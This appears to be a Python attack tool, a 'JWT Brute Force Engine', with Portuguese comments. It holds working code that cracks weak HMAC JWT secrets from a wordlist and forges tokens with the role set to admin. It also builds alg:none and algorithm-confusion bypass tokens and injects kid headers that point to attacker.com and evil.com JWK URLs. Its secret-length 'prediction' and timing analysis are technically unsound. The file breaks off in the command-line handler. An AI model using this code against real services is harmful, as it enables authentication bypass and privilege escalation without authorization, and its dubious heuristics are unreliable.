#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
JWT Brute Force Engine v2 — Cracking com técnicas avançadas
Suporta: alg:none, weak secrets, kid injection, header manipulation, timing side-channel
Version: 2.0
"""
import sys
import os
import json
import time
import hashlib
import hmac
import base64
import re
import argparse
import urllib.request
import urllib.error
from pathlib import Path
from typing import Dict, List, Optional, Tuple
from collections import defaultdict, Counter
import statistics

VERSION = "2.0"
LOG_DIR = Path(__file__).parent / "log"
LOG_DIR.mkdir(exist_ok=True)

# ============================================================================
# Dicionários expandidos
# ============================================================================
WEAK_SECRETS = [
    # Common defaults
    "secret", "password", "changeme", "123456", "admin", "key",
    "jwt_secret", "jwt", "your-secret-key", "supersecret", "mysecret",
    "mysupersecreat", "dev_secret", "test_secret", "local_dev",
    # Framework defaults
    "flask", "django", "express", "nestjs", "laravel", "spring",
    "rubyonrails", "dotnet", "nodejs", "python", "java",
    # Cloud/platform
    "aws", "azure", "gcp", "google", "amazon", "microsoft",
    "firebase", "heroku", "vercel", "netlify", "render",
    # Language/framework specific
    "algorithms.HS256", "HS256", "HS384", "HS512",
    "secret_key", "SECRET_KEY", "secretkey", "SECRETKEY",
    "auth_secret", "api_secret", "app_secret", "token_secret",
    # Popular open source
    "example", "test", "demo", "sample", "placeholder",
    "please-change-me", "change-me", "replace-me",
    # Node/JS ecosystem
    "nodejs", "npm", "webpack", "babel", "eslint",
    # Python ecosystem
    "python3", "pip", "pylint", "black", "flake8",
    # Java ecosystem
    "maven", "gradle", "springboot", "jakarta",
    # PHP ecosystem
    "php", "composer", "symfony", "wordpress", "woocommerce",
    # Other
    "random", "random_string", "your-random-string",
    "thisisaverysecuresecret", "thisismysecret",
    "jwtsecret", "jwt_secret_key", "jwt-secret",
    # Numeric patterns
    "12345678", "123456789", "1234567890", "1234567890123456",
    "abcdef", "abcdef123456", "abcdefgh",
    # Base64-looking
    "Y2hhbmdlbWU=", "c2VjcmV0", "cGFzc3dvcmQ=",
    # Hash-based
    hashlib.md5(b"secret").hexdigest(),
    hashlib.sha256(b"secret").hexdigest(),
    # Common names
    "alice", "bob", "charlie", "john", "doe",
    "company", "corp", "enterprise",
    # Tech companies
    "facebook", "twitter", "google", "apple", "amazon",
    "netflix", "spotify", "github", "gitlab", "slack",
    # More passwords
    "letmein", "welcome", "monkey", "dragon", "master",
    "qwerty", "login", "admin123", "root", "toor",
    "pass", "test123", "guest", "info", "mysql",
    "oracle", "sa", "manager", "access", "hello",
    "class", "framework", "application", "api",
    # Specific to common JWT libraries
    "jsonwebtoken", "jose", "jws", "jwk",
    # More patterns
    "a" * 32, "b" * 32, "secret" * 4, "password" * 4,
    # CTF/common challenge
    "ctf", "flag", "pwn", "hack", "exploit",
    "vuln", "vulnerability", "test1", "test2",
    # Common in source code / README
    "my_jwt_secret", "your_jwt_secret", "jwt_key",
    "jwt_access_secret", "access_secret", "refresh_secret",
    # Project names
    "mean", "mern", "fullstack", "webapp", "api_server",
    # Environment-specific
    "staging", "production", "development", "local",
    # More frameworks
    "fastapi", "flask_secret", "kemal", "sinatra", "rails",
    # More company names
    "shopify", "stripe", "twilio", "sendgrid", "sendinblue",
    # Common phrases
    "iloveyou", "trustno1", "sunshine", "princess",
    "football", "baseball", "hockey", "soccer",
    # More patterns
    "qwerty123", "abc123", "password1", "secret123",
    "master123", "dragon1", "monkey1", "shadow1",
    "sunshine1", "trustno1", "iloveyou", "daniel",
    # Hex patterns
    "deadbeef", "cafebabe", "0xDEADBEEF",
    # UUIDs and hashes used as secrets
    "5f4dcc3b5aa765d61d8327deb882cf99",  # md5 of password
]

# Known JWT header patterns for enumeration
JWT_ALGORITHMS = ["HS256", "HS384", "HS512", "RS256", "RS384", "RS512", "ES256", "ES384", "ES512", "PS256", "PS384", "PS512", "none"]

# Pattern-based secret prediction rules
SECRET_PATTERNS = [
    (r"^[a-z]{3,10}$", "common_word"),
    (r"^\d{6,16}$", "numeric"),
    (r"^[a-zA-Z0-9]{16,32}$", "base64_like"),
    (r"^[a-f0-9]{32}$", "md5_hex"),
    (r"^[a-f0-9]{64}$", "sha256_hex"),
    (r"^.{0,20}$", "short_secret"),
    (r"^.{30,}$", "long_secret"),
    (r"^[\w\-\.]+$", "safe_chars"),
]


# ============================================================================
# JWT Decoder
# ============================================================================
class JWTDecoder:
    """Decodes and analyzes JWT tokens."""

    @staticmethod
    def decode(token: str) -> Dict:
        """Decode JWT without verification."""
        parts = token.strip().split(".")
        if len(parts) != 3:
            return {"error": "Invalid JWT format (need 3 parts)"}

        try:
            header_b64 = parts[0] + "=" * ((4 - len(parts[0]) % 4) % 4)
            payload_b64 = parts[1] + "=" * ((4 - len(parts[1]) % 4) % 4)

            header = json.loads(base64.urlsafe_b64decode(header_b64))
            payload = json.loads(base64.urlsafe_b64decode(payload_b64))

            return {
                "header": header,
                "payload": payload,
                "signature": parts[2],
                "alg": header.get("alg", "unknown"),
                "typ": header.get("typ", "JWT"),
                "kid": header.get("kid", None),
                "iss": payload.get("iss", None),
                "sub": payload.get("sub", None),
                "exp": payload.get("exp", None),
                "iat": payload.get("iat", None),
                "jti": payload.get("jti", None),
                "valid_expires": payload.get("exp", 0) > int(time.time()) if payload.get("exp") else None,
                "missing_exp": "exp" not in payload,
                "none_alg": header.get("alg", "").lower() == "none",
            }
        except Exception as e:
            return {"error": f"Decode error: {str(e)}"}

    @staticmethod
    def analyze(token: str) -> Dict:
        """Full analysis of JWT token with expanded checks."""
        decoded = JWTDecoder.decode(token)
        if "error" in decoded:
            return decoded

        findings = []
        risks = []

        # Check alg:none
        if decoded["none_alg"]:
            findings.append("ALGORITHM: none (no signature)")
            risks.append("CRITICAL: alg:none allows unsigned tokens")

        # Check missing expiry
        if decoded["missing_exp"]:
            findings.append("MISSING EXP: Token never expires")
            risks.append("HIGH: No expiration = permanent validity")

        # Check algorithm weakness
        alg = decoded["alg"]
        if alg in ("HS256", "HS384", "HS512"):
            findings.append(f"ALGORITHM: {alg} (symmetric, crackable)")
            risks.append("MEDIUM: HMAC can be brute-forced with weak secret")
        elif alg in ("RS256", "RS384", "RS512"):
            findings.append(f"ALGORITHM: {alg} (asymmetric — check kid injection)")
            risks.append("MEDIUM: RSA can be bypassed with kid injection / typ confusion")
        elif alg in ("ES256", "ES384", "ES512"):
            findings.append(f"ALGORITHM: {alg} (elliptic curve)")
            risks.append("LOW: ECDSA is strong, but check for implementation flaws")
        elif alg in ("PS256", "PS384", "PS512"):
            findings.append(f"ALGORITHM: {alg} (RSA-PSS)")
            risks.append("MEDIUM: RSA-PSS can be targeted with key confusion")

        # Check for sensitive data in payload
        sensitive_keys = ["password", "passwd", "pin", "secret", "token", "key", "ssn", "credit",
                          "email", "phone", "address", "birth", "gender", "role", "admin"]
        payload = decoded.get("payload", {})
        for key in payload.keys():
            if any(s in key.lower() for s in sensitive_keys):
                findings.append(f"SENSITIVE KEY: '{key}' in payload")
                if any(s in key.lower() for s in ["password", "pin", "secret", "key"]):
                    risks.append("HIGH: Sensitive credential data exposed in JWT")
                else:
                    risks.append("MEDIUM: Personal data exposed in JWT")

        # Check for admin role
        if payload.get("role") == "admin" or payload.get("isAdmin") is True or payload.get("isAdmin") == "true":
            findings.append("ADMIN ROLE: Token has admin privileges")
            risks.append("HIGH: Admin token — high value target")

        # Check iss/domain
        if payload.get("domain") or payload.get("iss"):
            findings.append(f"ISSUER: {payload.get('iss', 'N/A')}")

        # Check token length (short sig may indicate weak key)
        sig_len = len(decoded.get("signature", ""))
        if sig_len < 20:
            findings.append(f"SHORT SIGNATURE: {sig_len} chars — possible weak key")
            risks.append("MEDIUM: Short signature may indicate truncation or weak key")

        # Check for hardcoded timestamps
        iat = payload.get("iat", 0)
        exp = payload.get("exp", 0)
        now = int(time.time())
        if iat and iat > now + 86400 * 365:
            findings.append(f"FUTURE IAT: {iat} is in the future")
            risks.append("MEDIUM: FutureIssuedAt may indicate clock manipulation")
        if exp and exp < now:
            findings.append("EXPIRED: Token has expired")
            risks.append("INFO: Token is expired — may still work if server doesn't check exp")

        # Secret length prediction
        secret_pred = SecretPredictor.predict_from_token(token, decoded)
        if secret_pred:
            findings.append(f"SECRET PREDICTION: {secret_pred['assessment']}")
            if secret_pred.get("likely_length"):
                findings.append(f"LIKELY SECRET LENGTH: {secret_pred['likely_length']} chars")

        return {
            **decoded,
            "findings": findings,
            "risks": risks,
            "risk_score": len([r for r in risks if "CRITICAL" in r]) * 3 +
                          len([r for r in risks if "HIGH" in r]) * 2 +
                          len([r for r in risks if "MEDIUM" in r]) * 1,
            "secret_prediction": secret_pred,
        }


# ============================================================================
# Algorithm Fingerprint Detector
# ============================================================================
class AlgFingerprintDetector:
    """Detect JWT algorithm by signature characteristics."""

    ALG_INDICATORS = {
        "HS256": {"min_sig_len": 20, "max_sig_len": 44, "charset": "alphanumeric"},
        "HS384": {"min_sig_len": 44, "max_sig_len": 65, "charset": "alphanumeric"},
        "HS512": {"min_sig_len": 64, "max_sig_len": 87, "charset": "alphanumeric"},
        "RS256": {"min_sig_len": 80, "max_sig_len": 120, "charset": "alphanumeric"},
        "RS384": {"min_sig_len": 100, "max_sig_len": 160, "charset": "alphanumeric"},
        "RS512": {"min_sig_len": 120, "max_sig_len": 200, "charset": "alphanumeric"},
        "ES256": {"min_sig_len": 40, "max_sig_len": 65, "charset": "alphanumeric"},
        "ES384": {"min_sig_len": 60, "max_sig_len": 100, "charset": "alphanumeric"},
        "ES512": {"min_sig_len": 80, "max_sig_len": 140, "charset": "alphanumeric"},
        "none":  {"sig_len": 0, "empty_sig": True},
    }

    @classmethod
    def fingerprint(cls, token: str) -> Dict:
        """Fingerprint algorithm from token structure."""
        parts = token.strip().split(".")
        if len(parts) != 3:
            return {"error": "Invalid JWT format"}

        sig = parts[2]
        sig_len = len(sig)

        # Check for empty signature (alg:none)
        if sig_len == 0:
            return {
                "detected_alg": "none",
                "confidence": "HIGH",
                "reason": "Empty signature indicates alg:none",
                "attack_vector": "alg:none bypass already active",
            }

        # Analyze charset
        has_upper = bool(re.search(r'[A-Z]', sig))
        has_lower = bool(re.search(r'[a-z]', sig))
        has_digit = bool(re.search(r'[0-9]', sig))
        has_special = bool(re.search(r'[^A-Za-z0-9+=/]', sig))

        charset_score = sum([has_upper, has_lower, has_digit])

        # Match by signature length
        matches = []
        for alg, info in cls.ALG_INDICATORS.items():
            if alg == "none":
                continue
            min_len = info.get("min_sig_len", 0)
            max_len = info.get("max_sig_len", 999)
            if min_len <= sig_len <= max_len:
                matches.append(alg)

        # Prefer symmetric for brute force candidates
        hmac_matches = [m for m in matches if m.startswith("HS")]
        rsa_matches = [m for m in matches if m.startswith("RS")]
        ec_matches = [m for m in matches if m.startswith("ES")]
        ps_matches = [m for m in matches if m.startswith("PS")]

        primary = hmac_matches or rsa_matches or ec_matches or ps_matches or matches

        return {
            "detected_algs": matches,
            "primary_guess": primary[0] if primary else "unknown",
            "sig_length": sig_len,
            "charset": {
                "has_upper": has_upper,
                "has_lower": has_lower,
                "has_digit": has_digit,
                "has_special": has_special,
            },
            "brute_force_feasible": bool(hmac_matches),
            "recommended_attack": "dictionary" if hmac_matches else "kid_injection_or_typ_confusion",
        }


# ============================================================================
# Secret Predictor (pattern-based)
# ============================================================================
class SecretPredictor:
    """Predict secret characteristics from token analysis."""

    @staticmethod
    def predict_from_token(token: str, decoded: Dict) -> Optional[Dict]:
        """Analyze token to predict secret characteristics."""
        alg = decoded.get("alg", "unknown")
        sig = decoded.get("signature", "")
        payload = decoded.get("payload", {})

        if alg not in ("HS256", "HS384", "HS512"):
            return None

        sig_len = len(sig)

        # Infer likely secret length from signature
        # HS256 produces 32-byte signature → base64url = ~43 chars
        # The secret length doesn't directly correlate with sig length,
        # but we can make educated guesses

        # Check payload for hints about secret
        iss = payload.get("iss", "")
        sub = payload.get("sub", "")
        jti = payload.get("jti", "")

        predictions = []

        # Length estimation based on common patterns
        if sig_len <= 30:
            predictions.append({"likely_length": "short (8-16 chars)", "type": "weak"})
        elif sig_len <= 43:
            predictions.append({"likely_length": "medium (16-32 chars)", "type": "medium"})
        else:
            predictions.append({"likely_length": "long (32+ chars)", "type": "strong"})

        # Look for clues in payload
        if iss:
            predictions.append(f"issuer_hint: {iss}")
        if sub:
            predictions.append(f"subject_hint: {sub}")

        # Check if token was generated from common frameworks
        payload_str = json.dumps(payload)
        framework_hints = {
            "flask": "flask", "django": "django", "express": "express",
            "nestjs": "nestjs", "laravel": "laravel", "spring": "spring",
        }
        for fw, name in framework_hints.items():
            if fw in payload_str.lower():
                predictions.append(f"possible_framework: {name}")
                break

        return {
            "assessment": "; ".join(str(p) for p in predictions),
            "likely_length": predictions[0].get("likely_length") if predictions else None,
            "type": predictions[0].get("type", "unknown") if predictions else "unknown",
        }


# ============================================================================
# JWT Brute Force Engine
# ============================================================================
class JWTBruteForce:
    """Cracks JWT secrets using dictionary attacks with frequency optimization."""

    def __init__(self, wordlist: Optional[List[str]] = None):
        self.wordlist = wordlist or list(WEAK_SECRETS)
        self.results = []
        self._attempts = 0
        self._found = False
        self._timing_log: List[float] = []

    def add_word(self, word: str):
        self.wordlist.append(word)

    def add_wordlist(self, words: List[str]):
        self.wordlist.extend(words)

    def _hmac_sign(
        self, message: str, secret: str, alg: str = "HS256"
    ) -> str:
        """Generate HMAC signature for testing."""
        alg_map = {
            "HS256": hashlib.sha256,
            "HS384": hashlib.sha384,
            "HS512": hashlib.sha512,
        }
        hash_func = alg_map.get(alg, hashlib.sha256)

        signature = hmac.new(
            secret.encode("utf-8"),
            message.encode("utf-8"),
            hash_func,
        ).digest()
        return base64.urlsafe_b64encode(signature).rstrip(b"=").decode()

    def crack(
        self,
        token: str,
        alg: Optional[str] = None,
        timeout: int = 30,
        smart_order: bool = True,
        verbose: bool = True,
    ) -> Dict:
        """Brute force JWT secret with optional smart ordering."""
        decoded = JWTDecoder.decode(token)
        if "error" in decoded:
            return {"error": decoded["error"]}

        target_alg = alg or decoded.get("alg", "HS256")
        parts = token.strip().split(".")
        if len(parts) != 3:
            return {"error": "Invalid JWT format"}

        signing_input = f"{parts[0]}.{parts[1]}"
        original_sig = parts[2]

        self._found = False
        self._attempts = 0
        self._timing_log = []
        start_time = time.time()

        results = []

        # Try alg:none first
        if target_alg.upper() == "NONE" or decoded.get("none_alg"):
            results.append({
                "secret": "",
                "alg": "none",
                "method": "alg_none",
                "verified": True,
                "time": 0.0,
            })
            self._found = True
            return {
                "success": True,
                "found": True,
                "secret": "",
                "alg": "none",
                "method": "alg:none bypass",
                "time_elapsed": 0.0,
                "attempts": 0,
                "results": results,
            }

        # Only brute force HMAC algorithms
        if not target_alg.startswith("HS"):
            fp = AlgFingerprintDetector.fingerprint(token)
            return {
                "success": False,
                "found": False,
                "message": f"Algorithm {target_alg} is asymmetric — cannot brute force with dictionary",
                "suggestion": "Try RSA/JWT abuse, kid injection, or key confusion attacks",
                "fingerprint": fp,
                "recommended_attack": fp.get("recommended_attack", "kid_injection"),
            }

        # Build ordered wordlist
        wordlist = list(self.wordlist)
        if smart_order:
            wordlist = self._smart_order(wordlist, decoded)

        # Brute force
        for secret in wordlist:
            if self._found:
                break
            if time.time() - start_time > timeout:
                break

            t0 = time.perf_counter()
            self._attempts += 1
            computed = self._hmac_sign(signing_input, secret, target_alg)
            t1 = time.perf_counter()
            self._timing_log.append((t1 - t0) * 1000)  # ms

            if computed == original_sig:
                elapsed = time.time() - start_time
                result = {
                    "secret": secret,
                    "alg": target_alg,
                    "method": "dictionary",
                    "verified": True,
                    "time": elapsed,
                }
                results.append(result)
                self._found = True
                break

            # Progress logging
            if self._attempts % 500 == 0 and verbose:
                elapsed = time.time() - start_time
                rate = self._attempts / elapsed if elapsed > 0 else 0
                bar_len = min(30, int(elapsed) if elapsed > 0 else 1)
                bar = '█' * bar_len + '░' * max(0, 30 - bar_len)
                sys.stderr.write(f"\r  [*] [{bar}] {self._attempts} attempts ({rate:.0f}/sec)...")
                sys.stderr.flush()

        elapsed = time.time() - start_time
        rate = self._attempts / elapsed if elapsed > 0 else 0

        timing_stats = {}
        if self._timing_log:
            timing_stats = {
                "avg_ms": round(statistics.mean(self._timing_log), 3),
                "min_ms": round(min(self._timing_log), 3),
                "max_ms": round(max(self._timing_log), 3),
            }

        if self._found:
            return {
                "success": True,
                "found": True,
                "secret": results[0]["secret"],
                "alg": target_alg,
                "method": "dictionary",
                "time_elapsed": round(elapsed, 2),
                "attempts": self._attempts,
                "rate": round(rate, 0),
                "timing": timing_stats,
                "results": results,
            }
        else:
            return {
                "success": False,
                "found": False,
                "message": f"Not found in {self._attempts} attempts ({elapsed:.1f}s)",
                "attempts": self._attempts,
                "rate": round(rate, 0),
                "time_elapsed": round(elapsed, 2),
                "timing": timing_stats,
                "next_steps": [
                    "Try a larger wordlist",
                    "Check for kid injection vulnerability",
                    "Try header manipulation (typ confusion)",
                    "Check for JWT known key databases",
                    "Try timing side-channel attack",
                ],
            }

    def _smart_order(
        self, wordlist: List[str], decoded: Dict
    ) -> List[str]:
        """Order wordlist by likelihood based on token analysis."""
        # Simple frequency-based reordering
        # Prioritize shorter secrets for HS256, longer for HS512
        alg = decoded.get("alg", "HS256")
        if alg == "HS512":
            # HS512 likely uses longer secrets
            wordlist.sort(key=lambda w: (-len(w), w))
        elif alg == "HS256":
            # HS256 often uses shorter secrets
            wordlist.sort(key=lambda w: (len(w), w))
        else:
            wordlist.sort(key=lambda w: (len(w), w))

        # Move common secrets to front
        common_front = ["secret", "password", "changeme", "123456", "admin", "key",
                        "jwt_secret", "jwt", "your-secret-key", "supersecret",
                        "secret_key", "SECRET_KEY"]
        reordered = [w for w in common_front if w in wordlist]
        remaining = [w for w in wordlist if w not in common_front]
        return reordered + remaining

    def timing_attack(
        self, token: str, alg: str = "HS256", timeout: int = 30
    ) -> Dict:
        """Timing side-channel attack — detect secret length by response time."""
        parts = token.strip().split(".")
        if len(parts) != 3:
            return {"error": "Invalid JWT format"}

        signing_input = f"{parts[0]}.{parts[1]}"
        original_sig = parts[2]

        # Measure baseline
        baselines = []
        for _ in range(5):
            t0 = time.perf_counter()
            self._hmac_sign(signing_input, "baseline_test", alg)
            baselines.append((time.perf_counter() - t0) * 1000)

        avg_baseline = statistics.mean(baselines) if baselines else 0

        # Test candidate secrets of different lengths
        length_results = {}
        for length in range(4, 33):
            tests = []
            for _ in range(3):
                test_secret = "x" * length
                t0 = time.perf_counter()
                self._hmac_sign(signing_input, test_secret, alg)
                elapsed = (time.perf_counter() - t0) * 1000
                tests.append(elapsed)
            avg_time = statistics.mean(tests)
            deviation = avg_time - avg_baseline
            length_results[length] = {
                "avg_ms": round(avg_time, 3),
                "deviation_ms": round(deviation, 3),
            }

        # Find outliers (significantly slower = possible partial match)
        deviations = [(l, r["deviation_ms"]) for l, r in length_results.items()]
        deviations.sort(key=lambda x: -abs(x[1]))

        return {
            "baseline_avg_ms": round(avg_baseline, 3),
            "length_analysis": length_results,
            "suspect_lengths": [l for l, d in deviations[:5]],
            "note": "Timing attacks require server-side comparison; this estimates local HMAC timing",
        }

    def verify_token(self, token: str, secret: str, alg: str = "HS256") -> bool:
        """Verify a token with a known secret."""
        decoded = JWTDecoder.decode(token)
        if "error" in decoded:
            return False

        parts = token.strip().split(".")
        signing_input = f"{parts[0]}.{parts[1]}"
        computed = self._hmac_sign(signing_input, secret, alg)
        return computed == parts[2]

    def generate_forged_token(
        self,
        token: str,
        secret: str,
        alg: str = "HS256",
        new_payload: Optional[Dict] = None,
        new_header: Optional[Dict] = None,
    ) -> str:
        """Forge a new JWT with modified payload and/or header."""
        decoded = JWTDecoder.decode(token)
        if "error" in decoded:
            return ""

        if new_payload is None:
            new_payload = dict(decoded.get("payload", {}))

        # Ensure admin privileges
        new_payload["role"] = "admin"
        new_payload["isAdmin"] = True

        if new_header is None:
            new_header = {"alg": alg, "typ": "JWT"}
        else:
            new_header = dict(new_header)
            new_header["alg"] = alg
            new_header["typ"] = "JWT"

        header_b64 = base64.urlsafe_b64encode(json.dumps(new_header).encode()).rstrip(b"=").decode()
        payload_b64 = base64.urlsafe_b64encode(json.dumps(new_payload).encode()).rstrip(b"=").decode()

        signing_input = f"{header_b64}.{payload_b64}"
        signature = self._hmac_sign(signing_input, secret, alg)

        return f"{header_b64}.{payload_b64}.{signature}"


# ============================================================================
# JWT Header Attacks
# ============================================================================
class JWTHeaderAttacks:
    """Advanced JWT header manipulation attacks."""

    @staticmethod
    def alg_none_attack(token: str) -> Optional[str]:
        """Try alg:none attack."""
        parts = token.strip().split(".")
        if len(parts) != 3:
            return None

        header_padded = parts[0] + "=" * ((4 - len(parts[0]) % 4) % 4)
        try:
            header_data = json.loads(base64.urlsafe_b64decode(header_padded).decode())
        except Exception:
            return None

        header_data["alg"] = "none"
        new_header = base64.urlsafe_b64encode(
            json.dumps(header_data).encode()
        ).rstrip(b"=").decode()

        return f"{new_header}.{parts[1]}."

    @staticmethod
    def kid_injection(token: str, kid_target: str = "attacker.com") -> str:
        """Try kid injection for key confusion."""
        parts = token.strip().split(".")
        if len(parts) != 3:
            return ""

        header_padded = parts[0] + "=" * ((4 - len(parts[0]) % 4) % 4)
        try:
            header_data = json.loads(base64.urlsafe_b64decode(header_padded).decode())
        except Exception:
            return ""

        header_data["kid"] = kid_target
        new_header = base64.urlsafe_b64encode(
            json.dumps(header_data).encode()
        ).rstrip(b"=").decode()

        return f"{new_header}.{parts[1]}.{parts[2]}"

    @staticmethod
    def typ_confusion(token: str) -> str:
        """Try typ:JWT with HS256 to bypass RS256 verification."""
        parts = token.strip().split(".")
        if len(parts) != 3:
            return ""

        header_padded = parts[0] + "=" * ((4 - len(parts[0]) % 4) % 4)
        try:
            header_data = json.loads(base64.urlsafe_b64decode(header_padded).decode())
        except Exception:
            return ""

        original_alg = header_data.get("alg", "")
        # Try all RSA→HMAC confusion paths
        conversions = {
            "RS256": "HS256",
            "RS384": "HS384",
            "RS512": "HS512",
            "ES256": "HS256",
            "ES384": "HS384",
            "ES512": "HS512",
            "PS256": "HS256",
            "PS384": "HS384",
            "PS512": "HS512",
        }
        if original_alg in conversions:
            header_data["alg"] = conversions[original_alg]
            header_data["typ"] = "JWT"
            new_header = base64.urlsafe_b64encode(
                json.dumps(header_data).encode()
            ).rstrip(b"=").decode()
            return f"{new_header}.{parts[1]}.{parts[2]}"

        return ""

    @staticmethod
    def extract_kid(token: str) -> Optional[str]:
        """Extract kid from token header."""
        parts = token.strip().split(".")
        if len(parts) != 3:
            return None

        header_padded = parts[0] + "=" * ((4 - len(parts[0]) % 4) % 4)
        try:
            header_data = json.loads(base64.urlsafe_b64decode(header_padded).decode())
            return header_data.get("kid")
        except Exception:
            return None

    @staticmethod
    def multiple_header_attacks(token: str) -> List[Dict]:
        """Run all header manipulation attacks and return results."""
        results = []

        # alg:none
        alg_none = JWTHeaderAttacks.alg_none_attack(token)
        results.append({
            "attack": "alg_none",
            "result": alg_none,
            "applicable": alg_none is not None,
        })

        # typ confusion
        typ_conf = JWTHeaderAttacks.typ_confusion(token)
        results.append({
            "attack": "typ_confusion",
            "result": typ_conf,
            "applicable": bool(typ_conf),
        })

        # kid injection
        kid = JWTHeaderAttacks.extract_kid(token)
        if kid:
            results.append({
                "attack": "kid_injection",
                "result": f"kid present: {kid}",
                "applicable": True,
                "hint": f"Target JWK endpoint: {kid}",
            })
        else:
            # Try generic kid injection
            injected = JWTHeaderAttacks.kid_injection(token, "http://attacker.com/jwk.json")
            results.append({
                "attack": "kid_injection_generic",
                "result": injected,
                "applicable": bool(injected),
            })

        return results


# ============================================================================
# CLI Interface
# ============================================================================
def main():
    parser = argparse.ArgumentParser(
        description=f"JWT Brute Force Engine v{VERSION}",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python jwt_bruteforce.py --analyze eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
  python jwt_bruteforce.py --crack <token> --timeout 10
  python jwt_bruteforce.py --crack <token> --alg HS256 --wordlist secrets.txt
  python jwt_bruteforce.py --forged <token> --secret mysecret --role admin
  python jwt_bruteforce.py --alg-none <token>
  python jwt_bruteforce.py --kid-inject <token> --kid http://evil.com/jwk.json
  python jwt_bruteforce.py --fingerprint <token>
  python jwt_bruteforce.py --predict <token>
        """,
    )
    parser.add_argument("--analyze", "-a", metavar="TOKEN", help="Analyze JWT token")
    parser.add_argument("--crack", "-c", metavar="TOKEN", help="Brute force JWT secret")
    parser.add_argument("--alg", "-A", metavar="ALG", default="HS256", help="Algorithm (default: HS256)")
    parser.add_argument("--timeout", "-t", type=int, default=30, help="Crack timeout in seconds")
    parser.add_argument("--wordlist", "-w", metavar="FILE", help="Custom wordlist file")
    parser.add_argument("--forged", "-f", metavar="TOKEN", help="Generate forged token")
    parser.add_argument("--secret", "-s", metavar="SECRET", help="Secret for forging")
    parser.add_argument("--role", "-r", metavar="ROLE", default="admin", help="Role for forged token")
    parser.add_argument("--alg-none", "-n", metavar="TOKEN", help="Try alg:none attack")
    parser.add_argument("--kid-inject", "-k", metavar="TOKEN", help="Try kid injection")
    parser.add_argument("--kid", metavar="URL", help="KID URL for injection")
    parser.add_argument("--fingerprint", metavar="TOKEN", help="Fingerprint algorithm from token")
    parser.add_argument("--predict", metavar="TOKEN", help="Predict secret characteristics")
    parser.add_argument("--timing", metavar="TOKEN", help="Run timing side-channel analysis")
    parser.add_argument("--headers", metavar="TOKEN", help="Run all header manipulation attacks")
    parser.add_argument("--json", "-j", action="store_true", help="JSON output")
    parser.add_argument("--quiet", "-q", action="store_true", help="Suppress progress output")

    args = parser.parse_args()

    decoder = JWTDecoder()
    cracker = JWTBruteForce()
    headers = JWTHeaderAttacks()

        # Load custom wordlist
    if hasattr(args, "wordlist") and args.wordlist:
        try:
            with open(args.wordlist, "r", encoding="utf-8") as f:
                custom = [line.strip() for line in f if line.strip()]
            cracker.add_wordlist(custom)
            print(f"[+] Loaded {len(custom)} custom words from {args.wordlist}")
        except FileNotFoundError:
            print(f"[-] Wordlist not found: {args.wordlist}")
            return
        except Exception as e:
            print(f"[-] Failed to load wordlist: {e}")

    # Analyze
    if args.analyze:
        result = decoder.analyze(args.analyze)
        if args.json:
            print(json.dumps(result, indent=2, default=str))
        else:
            print(f"\n{'='*60}")
            print(f"  JWT ANALYSIS")
            print(f"{'='*60}")
            print(f"  Alg:    {result.get('alg', 'N/A')}")
            print(f"  Typ:    {result.get('typ', 'N/A')}")
            print(f"  Kid:    {result.get('kid', 'N/A')}")
            print(f"  Iss:    {result.get('iss', 'N/A')}")
            print(f"  Sub:    {result.get('sub', 'N/A')}")
            print(f"  JTI:    {result.get('jti', 'N/A')}")
            print(f"  Exp:    {result.get('exp', 'N/A')}")
            print(f"  Valid:  {result.get('valid_expires', 'N/A')}")
            print(f"\n  Findings:")
            for f_item in result.get("findings", []):
                print(f"    ! {f_item}")
            if result.get("risks"):
                print(f"  Risks:")
                for r in result.get("risks", []):
                    print(f"    [{r.split(':')[0]}] {r.split(':', 1)[1].strip()}")
            pred = result.get("secret_prediction")
            if pred:
                print(f"\n  Secret Prediction: {pred.get('assessment', 'N/A')}")
            print(f"  Risk Score: {result.get('risk_score', 0)}/10")
        return

    # Crack
    if args.crack:
        verbose = not args.quiet
        result = cracker.crack(args.crack, alg=args.alg, timeout=args.timeout, verbose=verbose)
        if args.json:
            print(json.dumps(result, indent=2, default=str))
        else:
            print(f"\n{'='*60}")
            print(f"  JWT CRACK RESULTS")
            print(f"{'='*60}")
            if result.get("found"):
                print(f"  [+] SECRET FOUND: {result['secret']}")
                print(f"  [+] Algorithm: {result.get('alg', 'N/A')}")
                print(f"  [+] Method: {result.get('method', 'N/A')}")
                print(f"  [+] Attempts: {result.get('attempts', 0)}")
                print(f"  [+] Time: {result.get('time_elapsed', 0)}s")
                print(f"  [+] Rate: {result.get('rate', 0)}/sec")
                timing = result.get("timing", {})
                if timing:
                    print(f"  [+] Timing: avg={timing.get('avg_ms')}ms")
            else:
                print(f"  [-] Secret NOT found")
                print(f"  [-] Attempts: {result.get('attempts', 0)}")
                print(f"  [-] Time: {result.get('time_elapsed', 0)}s")
                rec = result.get("recommended_attack", "")
                if rec:
                    print(f"  [-] Recommended: {rec}")
                print(f"\n  Next steps:")
                for step in result.get("next_steps", []):
                    print(f"    > {step}")
        return

    # Forged token
    if args.forged:
        if not args.secret:
            print("[-] --secret required for forging")
            return
        forged = cracker.generate_forged_token(
            args.forged, args.secret, new_payload={"role": args.role}
        )
        if forged:
            print(f"[+] Forged token (role={args.role}):")
            print(forged)
            verified = cracker.verify_token(forged, args.secret)
            print(f"[+] Verified: {'YES' if verified else 'NO'}")
        else:
            print("[-] Failed to forge token")
        return

    # Alg:none
    if args.alg_none:
        result = headers.alg_none_attack(args.alg_none)
        if result:
            print(f"[+] alg:none bypass:")
            print(result)
        else:
            print("[-] alg:none attack failed")
        return

    # Kid injection
    if args.kid_inject:
        kid = args.kid or "http://attacker.com/jwk.json"
        result = headers.kid_injection(args.kid_inject, kid)
        if result:
            print(f"[+] KID injection:")
            print(result)
        else:
            print("[-] KID injection failed")
        return

    # Fingerprint
    if args.fingerprint:
        fp = AlgFingerprintDetector.fingerprint(args.fingerprint)
        if args.json:
            print(json.dumps(fp, indent=2))
        else:
            print(f"\n{'='*60}")
            print(f"  JWT ALGORITHM FINGERPRINT")
            print(f"{'='*60}")
            print(f"  Signature length: {fp.get('sig_length', 'N/A')}")
            print(f"  Detected algs: {', '.join(fp.get('detected_algs', []))}")
            print(f"  Primary guess: {fp.get('primary_guess', 'N/A')}")
            print(f"  Brute force feasible: {fp.get('brute_force_feasible', False)}")
            print(f"  Recommended attack: {fp.get('recommended_attack', 'N/A')}")
        return

    # Predict
    if args.predict:
